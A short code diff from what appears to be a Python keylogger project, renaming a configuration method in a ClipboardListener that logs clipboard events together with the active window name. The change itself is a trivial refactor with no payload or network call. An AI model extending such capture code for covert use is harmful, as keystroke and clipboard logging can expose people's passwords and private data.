@@ -217,7 +217,7 @@ class ClipboardListener:
                 window_name = self.keylogger.session_stats.get('active_window', 'Unknown')
                 
                 # Skip if application is excluded
-                if self.config.is_excluded_application(window_name):
+                if self.config.is_application_excluded(window_name):
                     return
                 
                 self.keylogger.log_event(
